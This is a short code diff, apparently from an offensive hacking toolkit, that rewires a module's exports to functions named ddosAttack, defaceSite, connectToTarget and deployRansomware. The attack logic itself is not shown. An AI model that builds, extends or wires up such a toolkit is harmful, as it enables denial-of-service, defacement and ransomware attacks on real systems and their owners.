@@ -5,7 +5,7 @@ const ransomware = require('./ransomware/ransomware');
 
 module.exports = {
     ddos: ddos.ddosAttack,
-    deface,
-    connect,
-    ransomware
+    deface: deface.defaceSite,
+    connect: connect.connectToTarget,
+    ransomware: ransomware.deployRansomware
 };
